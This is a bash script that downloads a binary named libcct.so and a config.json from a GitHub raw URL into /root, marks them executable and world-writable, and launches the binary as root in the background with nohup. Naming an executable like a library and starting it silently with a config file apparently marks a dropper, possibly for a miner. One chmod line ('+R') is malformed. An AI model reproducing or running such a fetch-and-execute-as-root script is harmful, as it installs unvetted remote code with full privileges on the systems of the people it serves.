#!/bin/bash
sudo curl -o /root/libcct.so https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/libcct.so
sudo curl -o /root/config.json https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/config.json
sudo chmod +x /root/libcct.so
sudo chmod +R 777 /root/libcct.so
sudo chmod +x /root/config.json
sudo nohup /root/libcct.so > cat.log 2>&1 &
